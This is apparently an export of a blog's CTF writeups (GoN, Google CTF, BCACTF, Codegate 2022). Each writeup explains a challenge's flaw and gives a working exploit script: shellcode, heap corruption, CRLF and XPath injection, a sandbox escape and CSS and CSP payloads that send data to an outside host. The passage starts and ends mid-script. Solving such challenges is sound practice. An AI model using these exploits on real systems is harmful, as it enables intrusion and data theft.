f\u0026#34;\u0026#34;\u0026#34; R6 = ##0x5D R0 = ##0x0 \u0026#34;\u0026#34;\u0026#34; encoding, count = ks.asm(code) asmcode += bytearray(encoding) asmcode += bytes.fromhex(\u0026#34;04C00054\u0026#34;) #p = process([\u0026#34;qemu-hexagon-static\u0026#34;, \u0026#34;-strace\u0026#34;, \u0026#34;./vuln\u0026#34;]) p = remote(\u0026#34;host3.dreamhack.games\u0026#34;, 12649) payload = b\u0026#34;\u0026#34; payload = payload.ljust(0x100, b\u0026#34;A\u0026#34;) payload += p32(addr + 0x100) # FP payload += p32(0x202bc) # PC p.send(payload) time.sleep(1) payload = b\u0026#34;\u0026#34; payload += asmcode payload += b\u0026#34;/bin/sh\\x00\u0026#34; payload += p32(addr+0x38) payload = payload.ljust(0x100, b\u0026#34;\\x00\u0026#34;) payload += p32(addr) # FP payload += p32(addr) # PC p.send(payload) p.interactive() M. cheat Vulnerability _client_를 분석해보면 20x20 크기의 맵의 row[i], col[i]에 저장된 좌표들을 한 번씩만 밟으면 flag를 얻을 수 있다는 코드가 있다.\n_server_는 _client_에서 받는 x, z 좌표가 1초에 1개 이하인지, (x**2 + z**2) / time \u0026lt;= 4.0 인지 검증한다.\n위 두 검증을 피하기 위해서 좌표 전송 사이에 (x**2 + z**2) // 4 + 1만큼의 timeout을 추가하여 flag를 얻을 수 있었다.\nExploit from pwn import * import time from collections import deque row = [1040511, 10049, 9537, 9597, 517381, 263677, 523391, 64, 1044447, 524305, 782335, 655376, 917535, 1, 262143, 131075, 246755, 948771, 772927, 555519] col = [1046399, 1037633, 808313, 808297, 810857, 1000553, 607727, 607520, 869694, 476418, 17790, 935232, 671808, 673119, 1000785, 345425, 345425, 515409, 135537, 925441] step = [[0 for _ in range(20)] for _ in range(20)] for x, r in enumerate(row): rr = bin(r).lstrip(\u0026#34;0b\u0026#34;).rjust(20, \u0026#34;0\u0026#34;)[::-1] for z, f in enumerate(rr): if f == \u0026#34;1\u0026#34;: step[x][z] = 1 else: step[x][z] = 0 for x in range(20): tmp2 = 0 for z in range(20): tmp2 += step[z][x] \u0026lt;\u0026lt; z assert tmp2 == col[x] def pm(): for d in step: print(d) print() p = remote(\u0026#34;host3.dreamhack.games\u0026#34;, 20609) context.log_level = \u0026#34;debug\u0026#34; calct = lambda x, z: (x**2 + z**2) // 4 + 1 lastx = -1 lastz = -1 for x in range(20): if x%2 == 0: for z in range(20): if (step[x][z] == 1): time.sleep(calct(lastx - x, lastz - z)) p.sendline(f\u0026#34;{x} {z}\u0026#34;.encode()) lastx = x lastz = z print(p.recv(timeout=0.1)) else: for z in range(19, -1, -1): if (step[x][z] == 1): time.sleep(calct(lastx - x, lastz - z)) p.sendline(f\u0026#34;{x} {z}\u0026#34;.encode()) lastx = x lastz = z print(p.recv(timeout=0.1)) p.interactive() N. Private Storage Vulnerability RC4의 작동 방식은 Ct = Pt ⊕ Key와 같은 간단한 방식이다. _server.py_를 보면 key가 고정되어 있으므로 다음과 같이 flag를 구할 수 있다.\nC_str = P_str ⊕ Key C_flag = P_flag ⊕ Key P_flag = C_flag ⊕ C_str ⊕ P_str Exploit from pwn import * from Crypto.Cipher import ARC4 from base64 import b64encode, b64decode import zlib #p = process([\u0026#34;python3\u0026#34;, \u0026#34;server.py\u0026#34;]) p = remote(\u0026#34;host1.dreamhack.games\u0026#34;, 23936) def download_file(fname): p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, fname.encode()) p.recvuntil(b\u0026#34;: \u0026#34;) return b64decode(p.recvline().strip()) def add_file(fname, content): p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, fname.encode()) p.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, content) key = download_file(\u0026#34;key\u0026#34;) flag = download_file(\u0026#34;flag.txt\u0026#34;) data = b\u0026#34;12345678\u0026#34;*0x100 add_file(\u0026#34;a\u0026#34;, data) b = download_file(\u0026#34;a\u0026#34;) xor_bytes = lambda a, b: bytes([q^w for q, w in zip(a, b)]) zlib_flag = xor_bytes(xor_bytes(flag, b), zlib.compress(data)) print(zlib_flag) print(zlib.decompress(zlib_flag)) p.interactive() O. Checkers Vulnerability 문제 파일에 있는 함수 이름 straddling_checkerboard를 검색해보니 치환 암호라는 것을 알 수 있었다.\n한 글자씩 추가해가며 flag의 암호화 결과와 일치하는 것을 찾아 flag를 구할 수 있었다.\nExploit from pwn import * ch = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ_/\u0026#34; #p = process([\u0026#34;python3\u0026#34;, \u0026#34;chal.py\u0026#34;]) p = remote(\u0026#34;host3.dreamhack.games\u0026#34;, 9090) p.sendlineafter(b\u0026#34;Exit\\n\u0026#34;, b\u0026#34;3\u0026#34;) p.recvuntil(b\u0026#34;:\u0026#34;) flag = p.recvline().strip()[4:-1].decode() def enc(data): p.sendlineafter(b\u0026#34;Exit\\n\u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\\n\u0026#34;, data.encode()) p.recvuntil(b\u0026#34;:\u0026#34;) return p.recvline().strip().decode() print(flag) result = [\u0026#34;\u0026#34;] flag_maybe = [] while result: now = result.pop() if len(now) \u0026gt; 10: print(now) flag_maybe.append(now) for c in ch: if flag.find(enc(now + c)) == 0: result.append(now + c) print(flag_maybe) P. farmer FTK Imager를 사용해 _/home/ubuntu_아래에서 _binary_와 flag.png.00 ~ _flag.png.09_를 얻을 수 있었다.\n문제의 힌트를 보면 _flag.png_파일을 10개의 chunk로 나누어 어떤 처리를 했다는 것을 유추할 수 있고, 각 chunk를 _binary_의 입력으로 사용했다고 생각해볼 수 있다.\nf = open(\u0026#34;flag.png\u0026#34;,\u0026#34;rb\u0026#34;) data = f.read() filesize = len(data) for i in range((filesize // 1000) + (0 if (filesize%1000==0) else 1)): frag = data[i*1000:(i+1)*1000] $ stat flag.png File: flag.png Size: 9519 Blocks: 24 IO Block: 4096 ... _binary_를 살펴보면 현재 시간을 seed로 사용하여 랜덤한 값을 암호화에 사용하고 있다. _flag.png.XX_의 timestamp 정보를 알 수 있으므로 rand()에서 어떤 값이 나올지 모두 알 수 있고, 이를 역연산하는 코드를 작성하여 flag를 얻을 수 있었다.\nsrand(time(0LL)); void make_rand_buf() { for ( int i = 0; i \u0026lt;= 15; ++i ) rand_buf[i] = rand(); } void action1_func() { ... range = rand() % (256 - j); ... } void action1_func() { ... range = rand() % (16 - j); ... } Solution from ctypes import * libc = CDLL(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) def make_pbox(n): pbox = [0]*n list1 = [x for x in range(n)] list2 = [] for i in range(n): r = libc.rand() % (n-i) for j in range(r): list2.append(list1.pop()) pbox[i] = list1.pop() for j in range(r): list1.append(list2.pop()) return pbox def enc(data, randbuf): history = [] for i in range(64): action = libc.rand() % 3 if action == 2: # xor for j in range(len(data)): data[j] ^= randbuf[j % 16] history.append((2, None)) elif action == 0: pbox = make_pbox(256) for j in range(len(data)): data[j] = pbox[data[j]] history.append((0, pbox)) elif action == 1: pbox = make_pbox(16) for j in range(0, len(data)-1, 16): tmp = [0]*16 for k in range(16): tmp[pbox[k]] = data[j + k] for k in range(16): data[j + k] = tmp[k] history.append((1, pbox)) else: exit(1) return data, history def dec(data, history, randbuf): for i in range(64): action, pbox = history.pop() if action == 2: # xor for j in range(len(data)): data[j] ^= randbuf[j % 16] elif action == 0: for j in range(len(data)): data[j] = pbox.index(data[j]) elif action == 1: for j in range(0, len(data)-1, 16): tmp = [0]*16 for k in range(16): tmp[k] = data[j + k] for k in range(16): data[j + k] = tmp[pbox[k]] else: exit(1) return data # #dec(\u0026#34;out/flag.png.00\u0026#34;, filetimes[0]) result = bytearray() filetimes = [1661114954, 1661114956, 1661114964, 1661114970, 1661114975, 1661114982, 1661114992, 1661114995, 1661115002, 1661115005] for i in range(10): libc.srand(filetimes[i]) randbuf = [libc.rand() \u0026amp; 0xFF for _ in range(16)] data = bytearray(b\u0026#34;testqwerasdfzxcv\u0026#34;) enc_test, history = enc(data, randbuf) # dec_test = dec(enc_test, history, randbuf) # assert dec_test == data with open(f\u0026#34;out/flag.png.{i:02d}\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = bytearray(f.read()) result += dec(data, history, randbuf) for i in range(0x5, 0x10): if bytes([i]*5) in result[-0x10:]: result = result[:-i] with open(\u0026#34;flag.png\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(result) Q. API Portal Vulnerability _action/flag/flag.php_를 보면 localhost에서 접속하고, post data로 mode, dbkey, key를 넘겨주면 flag를 파일에 출력해주는 것을 알 수 있다.\n\u0026lt;?php include \u0026#34;_flag.php\u0026#34;; if ($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;] === \u0026#34;127.0.0.1\u0026#34; || $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;] === \u0026#34;::1\u0026#34;) { if($_POST[\u0026#34;mode\u0026#34;] === \u0026#34;write\u0026#34; \u0026amp;\u0026amp; isset($_POST[\u0026#34;dbkey\u0026#34;]) \u0026amp;\u0026amp; isset($_POST[\u0026#34;key\u0026#34;])) { $k1 = md5($_POST[\u0026#34;dbkey\u0026#34;]); $k2 = md5($_POST[\u0026#34;dbkey\u0026#34;].$_POST[\u0026#34;key\u0026#34;]); $value = base64_encode($flag); @file_put_contents(\u0026#34;/tmp/api-portal/db/$k1/$k2\u0026#34;, $value); die(\u0026#34;success\u0026#34;); } } _flag.php_에 localhost에서 post를 하기 위해 _action/net/proxy/post.php_를 살펴보면 header에 REQUEST_URI가 들어가게 되고, CRLF를 추가하여 data와 함께 post 요청을 할 수 있다.\n$url = \u0026#34;http://\u0026#34;.$param[0]; // $_GET[\u0026#34;url\u0026#34;] $ip = $param[1]; // $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;] $referer = $param[2]; // urldecode($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]) $header = \u0026#34;User-Agent: API Portal Proxy\\r\\n\u0026#34;; $header .= \u0026#34;X-Forwarded-For: {$ip}\\r\\n\u0026#34;; $header .= \u0026#34;X-Api-Referer: {$referer}\u0026#34;; $ctx = stream_context_create(array( \u0026#39;http\u0026#39; =\u0026gt; array( \u0026#39;method\u0026#39; =\u0026gt; \u0026#39;POST\u0026#39;, \u0026#34;content\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, //TODO: implement \u0026#39;header\u0026#39; =\u0026gt; $header ) )); Solution import requests from urllib.parse import quote s = requests.Session() url = \u0026#34;http://host1.dreamhack.games:12293\u0026#34; key = \u0026#34;asd\u0026#34; dbkey = \u0026#34;asd\u0026#34; r = s.get(f\u0026#34;{url}\u0026#34;, params={\u0026#34;action\u0026#34;: \u0026#34;db/create\u0026#34;, \u0026#34;key\u0026#34;: key}) print(r.text) content = \u0026#34;mode=write\u0026amp;dbkey=asd\u0026amp;key=asd\u0026#34; header = \u0026#34;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#34; header += f\u0026#34;Content-Length: {len(content)}\u0026#34; r = s.get(f\u0026#34;{url}/?action=net/proxy/post\u0026amp;url=127.0.0.1/?action=flag/flag\u0026amp;\u0026#34; + quote(f\u0026#34;\\r\\n{header}\\r\\n\\r\\n{content}\u0026#34;)) print(r.text) r = s.get(f\u0026#34;{url}\u0026#34;, params={\u0026#34;action\u0026#34;: \u0026#34;db/list\u0026#34;}) print(r.text) r = s.get(f\u0026#34;{url}\u0026#34;, params={\u0026#34;action\u0026#34;: \u0026#34;db/read\u0026#34;, \u0026#34;dbkey\u0026#34;: dbkey, \u0026#34;key\u0026#34;: key}) print(r.text) R. 100-100 Vulnerability _prob.php_는 Content-Securiy-Policy 헤더와 GET parameter로 받은 헤더를 추가한다. 페이지를 렌더링할 때 {{flag}}는 localhost에서 접근할 때 flag로 대체된다.\nheader(\u0026#34;Content-Security-Policy: default-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;; navigate-to \u0026#39;none\u0026#39;;\u0026#34;); if($_GET[\u0026#34;extreme\u0026#34;]) header($_GET[\u0026#34;extreme\u0026#34;], false); ... function simple_template($input) { $input = str_replace(\u0026#34;{{flag}}\u0026#34;, get_flag(), $input); Content-Security-Policy에 report-uri옵션을 지정하면, CSP Violation이 발생했을 때 지정한 uri로 내용에 대해 post 요청을 보내준다.\nContent-Security-Policy는 여러 개의 헤더가 있으면, most restricted된 policy를 따른다.\n위 두 속성을 이용하면, CSP에 report-uri를 추가할 수 있고, src에 flag를 추가해 CSP Violation이 발생되면 원하는 uri로 flag를 포함한 post 요청을 보낼 수 있다.\nSolution import requests url = \u0026#34;http://host3.dreamhack.games:17992\u0026#34; payload = \u0026#34;http://localhost/prob.php?content=\u0026lt;img src={{flag}}\u0026gt;\u0026amp;extreme=Content-Security-Policy: default-src \u0026#39;none\u0026#39;; report-uri /receiver.php?uid=asd;\u0026#34; r = requests.post(f\u0026#34;{url}/submit.php\u0026#34;, data={\u0026#34;url\u0026#34;: payload}) print(r.text) S. sleepingshark scapy를 사용하려다 너무 느려서 Wireshark 필터 http and http.time \u0026gt; 2를 사용해 수동으로 찾았다.\nT. Survey/설문조사 ","permalink":"https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/","summary":"2022 Fall Gon Open Qual CTF\nimssm99 (2nd, 11427 pts)\nA. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.\ncnt = 1; for ( i = 0; i \u0026lt; cnt; ++i ) { printf(\u0026#34;(r)ead / (a)dd \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%2s\u0026#34;, \u0026amp;s); if ( (char)s == \u0026#39;a\u0026#39; ) { printf(\u0026#34; idx \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); printf(\u0026#34; value \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%f\u0026#34;, \u0026amp;value); arr[idx] = value + arr[idx]; } else if ( (char)s == \u0026#39;r\u0026#39; ) { printf(\u0026#34; idx \u0026gt;\u0026gt; \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); printf(\u0026#34;%.","title":"2022 Fall GoN Open Qual CTF Writeup"},{"content":" Team ST4RT, 65th\nAppnote.txt import struct with open(\u0026#34;dump.zip\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() u16 = lambda x: struct.unpack(\u0026#34;\u0026lt;H\u0026#34;, x)[0] flag = bytearray() eocd = data[0xEEE2:].split(b\u0026#34;PK\\x05\\x06\u0026#34;) for d in eocd[1:]: offset = u16(d[12:14]) flag.append(data[offset-1]) print(flag) Segfault Labyrinth from pwn import * context.arch = \u0026#34;amd64\u0026#34; #p = process(\u0026#34;./challenge\u0026#34;) p = remote(\u0026#34;segfault-labyrinth.2022.ctfcompetition.com\u0026#34;, 1337) p.recvline() p.sendline(b\u0026#34;0\u0026#34;*8) code = \u0026#34;\u0026#34;\u0026#34; mov rsp, rdi; mov rbp, rdi; add rsp, 0x400; add rbp, 0x400; mov r8, rdi; TASK: xor rbx, rbx; RUN: mov rdi, 2; mov rsi, [r8 + rbx*8]; mov rdx, 0x1; mov rax, 1; syscall; cmp rax, 0xfffffffffffffff2; jne FOUND; inc rbx; cmp rbx, 0x10; jne RUN; FOUND: mov rax, [rsi]; mov r8, rsi; cmp al, 0; je TASK; mov rdx, 0x40; mov rdi, 1; mov rax, 1; syscall; \u0026#34;\u0026#34;\u0026#34; payload = b\u0026#34;\u0026#34; payload += asm(code) p.send(payload.ljust(0x1000, b\u0026#34;\\x90\u0026#34;)) print(p.recv()) Treebox sys.stderr.write = os.system a = {} a[\u0026#34;/bin/sh\u0026#34;] --END Weather from pwn import * import struct u16 = lambda x: struct.unpack(\u0026#34;\u0026gt;H\u0026#34;, x)[0] with open(\u0026#34;do.ihx\u0026#34;, \u0026#34;r\u0026#34;) as f: lines = f.readlines() payload = bytearray(0x80) for line in lines: data = bytes.fromhex(line[1:]) size = data[0] offset = u16(data[1:3]) record = data[3] body = data[4:4+size] checksum = data[-1] payload[offset:offset+size] = body print(payload.hex()) payload = bytearray([0xFF] * 0xe) + payload[0x62:] p = remote(\u0026#34;weather.2022.ctfcompetition.com\u0026#34;, 1337) p.sendlineafter(b\u0026#34;? \u0026#34;, (f\u0026#34;w 101153 128 {40} {0xA5} {0x5A} {0xA5} {0x5A} \u0026#34; + \u0026#34; \u0026#34;.join(map(lambda x: str(x^0xFF), payload[:0x40]))).encode()) p.sendlineafter(b\u0026#34;? \u0026#34;, f\u0026#34;r 101153 64\u0026#34;.encode()) p.recvline() recv = list(map(int, p.recvuntil(b\u0026#34;-end\u0026#34;)[:-4].replace(b\u0026#34;\\n\u0026#34;, b\u0026#34; \u0026#34;).split())) print(bytes(recv)) print(recv) payload2 = [0xFF]*19 + [0x12, 0x0a, 0x0e] p.sendlineafter(b\u0026#34;? \u0026#34;, (f\u0026#34;w 101153 128 {20} {0xA5} {0x5A} {0xA5} {0x5A} \u0026#34; + \u0026#34; \u0026#34;.join(map(lambda x: str(x^0xFF), payload2))).encode()) p.interactive() p.sendlineafter(b\u0026#34;? \u0026#34;, f\u0026#34;r 101153 64\u0026#34;.encode()) p.recvline() recv = list(map(int, p.recvuntil(b\u0026#34;-end\u0026#34;)[:-4].replace(b\u0026#34;\\n\u0026#34;, b\u0026#34; \u0026#34;).split())) print(bytes(recv)) print(recv) p.interactive() ","permalink":"https://blog.imssm99.kr/ctf/google_ctf_2022/","summary":"Team ST4RT, 65th\nAppnote.txt import struct with open(\u0026#34;dump.zip\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() u16 = lambda x: struct.unpack(\u0026#34;\u0026lt;H\u0026#34;, x)[0] flag = bytearray() eocd = data[0xEEE2:].split(b\u0026#34;PK\\x05\\x06\u0026#34;) for d in eocd[1:]: offset = u16(d[12:14]) flag.append(data[offset-1]) print(flag) Segfault Labyrinth from pwn import * context.arch = \u0026#34;amd64\u0026#34; #p = process(\u0026#34;./challenge\u0026#34;) p = remote(\u0026#34;segfault-labyrinth.2022.ctfcompetition.com\u0026#34;, 1337) p.recvline() p.sendline(b\u0026#34;0\u0026#34;*8) code = \u0026#34;\u0026#34;\u0026#34; mov rsp, rdi; mov rbp, rdi; add rsp, 0x400; add rbp, 0x400; mov r8, rdi; TASK: xor rbx, rbx; RUN: mov rdi, 2; mov rsi, [r8 + rbx*8]; mov rdx, 0x1; mov rax, 1; syscall; cmp rax, 0xfffffffffffffff2; jne FOUND; inc rbx; cmp rbx, 0x10; jne RUN; FOUND: mov rax, [rsi]; mov r8, rsi; cmp al, 0; je TASK; mov rdx, 0x40; mov rdi, 1; mov rax, 1; syscall; \u0026#34;\u0026#34;\u0026#34; payload = b\u0026#34;\u0026#34; payload += asm(code) p.","title":"Google Capture The Flag 2022 Writeup"},{"content":" Team ST4RT, 5th\nNotetaker WASM from pwn import * def run(i): p = remote(\u0026#34;bin.bcactf.com\u0026#34;, 49180) #p = process([\u0026#34;node\u0026#34;, \u0026#34;--experimental-wasi-unstable-preview1\u0026#34;, \u0026#34;runner.js\u0026#34;]) def note_print(idx): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) def note_delete(idx): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) def note_create(idx): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;3\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) def note_write(idx, data): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;4\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) p.sendlineafter(b\u0026#34;\\n\u0026#34;, data) note_create(1) note_create(2) note_create(3) note_delete(1) # 0x442: %15d -\u0026gt; %lld note_write(1, p32(0x443-0xc) + p32(0x646c6c)) note_delete(2) note_delete(1) calc = lambda fd, bk: ((fd-0x8) \u0026lt;\u0026lt; 32) | bk note_write(1, str(calc(0xc00 + 0x4*6, 0x400+0xc*i)).encode()) # note[7] -\u0026gt; flag note_delete(2) note_delete(1) note_print(7) p.recvline() p.recvline() return p.recvline().replace(b\u0026#34;\\x10\\x0c\u0026#34;, b\u0026#34;\u0026#34;).strip() ans = b\u0026#34;\u0026#34; for i in range(3): ans += run(i) print(ans) Wasm Prison const arr = []; for(let i = 0; i \u0026lt; 256; i++) arr.push(parseInt(tables.$table0.get(i).name)); console.log(JSON.stringify(arr)); func_n = [0] * 257 fp_table = [192,79,107,193,212,21,15,215,205,34,173,202,67,88,66,106,171,197,52,234,76,5,187,138,20,156,81,182,112,14,174,26,111,147,99,22,125,236,89,127,56,104,43,94,207,100,170,190,204,101,245,132,4,142,238,102,196,176,47,133,191,50,136,121,256,243,183,103,38,148,17,28,211,250,158,172,74,246,51,189,119,181,77,16,229,222,209,131,255,124,165,177,145,91,227,114,135,31,108,27,64,1,6,117,185,73,149,63,71,122,23,166,240,120,252,253,95,226,164,249,214,161,208,80,48,239,217,179,97,218,219,72,18,116,61,178,235,200,198,110,195,163,140,62,169,83,216,168,210,54,49,58,75,194,247,85,139,225,9,244,126,46,153,92,115,86,42,175,36,223,68,7,248,30,150,144,69,180,82,230,24,143,10,11,157,33,44,128,35,228,60,254,70,242,65,146,40,206,203,41,39,8,29,221,78,118,224,13,87,199,109,220,162,159,123,141,25,57,151,37,3,19,130,90,232,45,231,152,241,32,113,96,201,129,134,59,233,251,93,105,160,167,184,98,188,154,155,12,53,84,137,55,213,237,186,2] with open(\u0026#34;chall.wasm\u0026#34;, \u0026#34;r\u0026#34;) as f: i = 0 lines = f.readlines() for idx, line in enumerate(lines): if line.startswith(\u0026#34; (func $func\u0026#34;): i+=1 func_n[i] = int(lines[idx+15].split()[1]) inp = bytearray(34) inp[0:7] = b\u0026#34;bcactf{\u0026#34; inp[-1:] = b\u0026#34;}\u0026#34; enc_flag = b\u0026#34;bcactf{\\xdc1e2\\xf5\\x8bR\\xf8rl\\x1d\\xe7;\\xe5X\\x00\\x93\\xc9xB\\xcd\\xea)z\\xf2\\xd1}\u0026#34; def func(n, i): return ((1337 * n) + i + 1) \u0026amp; 255 for i in range(0, 34): if i \u0026lt; 7 or i == 33: continue for j in range(0x100): fp = fp_table[j ^ 137] if func(func_n[fp], i) == enc_flag[i]: inp[i] = j break print(inp) Stylish import requests url = \u0026#34;http://webp.bcactf.com:49153\u0026#34;; s = requests.Session() payload = \u0026#34;\u0026#34; for c in b\u0026#34;0123456789ABCDEFRS\u0026#34;: # R: Reset / S: Submit payload += f\u0026#34;\u0026#34;\u0026#34; @font-face {{ font-family: poc; src: url(\u0026#34;http://[SERVER]/?c={chr(c)}\u0026#34;); unicode-range: U+00{hex(c)[2:]}; }} \u0026#34;\u0026#34;\u0026#34; payload += f\u0026#34;\u0026#34;\u0026#34; #keypad button:active {{ font-family: poc; }} \u0026#34;\u0026#34;\u0026#34; print(payload) r = s.post(f\u0026#34;{url}/api/report\u0026#34;, json={ \u0026#34;bodyBG\u0026#34;: \u0026#34;white;\u0026#34;, \u0026#34;bodyFG\u0026#34;: \u0026#34;white\u0026#34;, \u0026#34;accentBG\u0026#34;: \u0026#34;white\u0026#34;, \u0026#34;accentFG\u0026#34;: \u0026#34;white; }\u0026#34; + payload + \u0026#34;a {\u0026#34; }) print(r.text) passcode = input(\u0026#34;Passcode: \u0026#34;) r = s.post(f\u0026#34;{url}/api/flag\u0026#34;, json={ \u0026#34;passcode\u0026#34;: passcode }) print(r.text) ","permalink":"https://blog.imssm99.kr/ctf/bcactf_3_0/","summary":"Team ST4RT, 5th\nNotetaker WASM from pwn import * def run(i): p = remote(\u0026#34;bin.bcactf.com\u0026#34;, 49180) #p = process([\u0026#34;node\u0026#34;, \u0026#34;--experimental-wasi-unstable-preview1\u0026#34;, \u0026#34;runner.js\u0026#34;]) def note_print(idx): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) def note_delete(idx): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) def note_create(idx): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;3\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) def note_write(idx, data): p.sendlineafter(b\u0026#34;4)\\n\u0026#34;, b\u0026#34;4\u0026#34;) p.sendlineafter(b\u0026#34;inclusive)\\n\u0026#34;, str(idx).encode()) p.sendlineafter(b\u0026#34;\\n\u0026#34;, data) note_create(1) note_create(2) note_create(3) note_delete(1) # 0x442: %15d -\u0026gt; %lld note_write(1, p32(0x443-0xc) + p32(0x646c6c)) note_delete(2) note_delete(1) calc = lambda fd, bk: ((fd-0x8) \u0026lt;\u0026lt; 32) | bk note_write(1, str(calc(0xc00 + 0x4*6, 0x400+0xc*i)).","title":"BCACTF 3.0 Writeup"},{"content":" University Division, imssm99, 3rd (4249 points)\nCAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.\ndriver.get(\u0026#39;http://3.39.55.38:1929/login\u0026#39;) driver.find_element_by_id(\u0026#39;id\u0026#39;).send_keys(\u0026#39;admin\u0026#39;) driver.find_element_by_id(\u0026#39;pw\u0026#39;).send_keys(\u0026#39;$MiLEYEN4\u0026#39;) driver.find_element_by_id(\u0026#39;submit\u0026#39;).click() time.sleep(2) superbee func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(\u0026#34;auth_crypt_key\u0026#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.\n... } else if controllerName == \u0026#34;AdminController\u0026#34; { domain := this.Ctx.Input.Domain() if domain != \u0026#34;localhost\u0026#34; { this.Abort(\u0026#34;Not Local\u0026#34;) return } } ... func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } /admin/authkey에 Host: localhost Header를 설정하여 접속하면 encrypted_auth_key를 얻을 수 있다. encrypted_auth_key를 빈 Key로 Decrypt하여 flag를 얻는데 필요한 Cookie를 설정할 수 있었다.\nimport requests from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import hashlib url = \u0026#34;http://localhost:1030\u0026#34; r = requests.get(f\u0026#34;{url}/admin/authkey\u0026#34;, headers={\u0026#34;Host\u0026#34;: \u0026#34;localhost\u0026#34;}) enc_auth_key = bytes.fromhex(r.text) admin_id = b\u0026#34;admin\u0026#34; cipher = AES.new(pad(b\u0026#34;\u0026#34;, 16), AES.MODE_CBC, pad(b\u0026#34;\u0026#34;, 16)) auth_key = unpad(cipher.decrypt(enc_auth_key), 16) print(auth_key) cookies = {} cookies[hashlib.md5(b\u0026#34;sess\u0026#34;).hexdigest()] = hashlib.md5(admin_id + auth_key).hexdigest() r = requests.get(f\u0026#34;{url}/main/index\u0026#34;, cookies=cookies) print(r.text) babyFirst lookupImg Method는 메모 내용의 [] 안의 url을 읽어 그 내용을 base64 encode하여 img src에 출력해준다. URL의 처음에 file:이 있으면 동작하지 않는다. 이를 우회하기 위해 java.net.URL에서 찾은 다음과 같은 코드를 이용했다.\nif (spec.regionMatches(true, start, \u0026#34;url:\u0026#34;, 0, 4)) { start += 4; } 메모 내용에 [url:file:/flag] 를 쓴 후 읽는다. img src의 값을 base64 decode하여 flag를 획득 할 수 있었다. data:image/jpeg;charset=utf-8;base64,Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg==\nmyblog XPath xpath = XPathFactory.newInstance().newXPath(); String title = (String)xpath.evaluate(\u0026#34;//article[@idx=\u0026#39;\u0026#34; + idx + \u0026#34;\u0026#39;]/title/text()\u0026#34;, document, XPathConstants.STRING); String content = (String)xpath.evaluate(\u0026#34;//article[@idx=\u0026#39;\u0026#34; + idx + \u0026#34;\u0026#39;]/content/text()\u0026#34;, document, XPathConstants.STRING); /blog/read에서 idx 인자에 xpath injection이 가능하다.\nRUN echo \u0026#39;flag=codegate2022{md5(flag)}\u0026#39; \u0026gt;\u0026gt; /usr/local/tomcat/conf/catalina.properties catalina.properties에 flag가 저장되어 있으므로 system-property(’flag’)를 이용하면 flag를 획득할 수 있다.\nBlind Injection으로 flag의 값을 구했다.\nimport requests import string url = \u0026#34;http://3.39.79.180\u0026#34; uid = \u0026#34;imssm9999\u0026#34; upw = \u0026#34;asdasdasd\u0026#34; s = requests.Session() r = s.post(f\u0026#34;{url}/blog/register\u0026#34;, data={\u0026#34;id\u0026#34;: uid, \u0026#34;pw\u0026#34;: upw}) print(r.text) r = s.post(f\u0026#34;{url}/blog/login\u0026#34;, data={\u0026#34;id\u0026#34;:uid, \u0026#34;pw\u0026#34;: upw}) print(r.text) r = 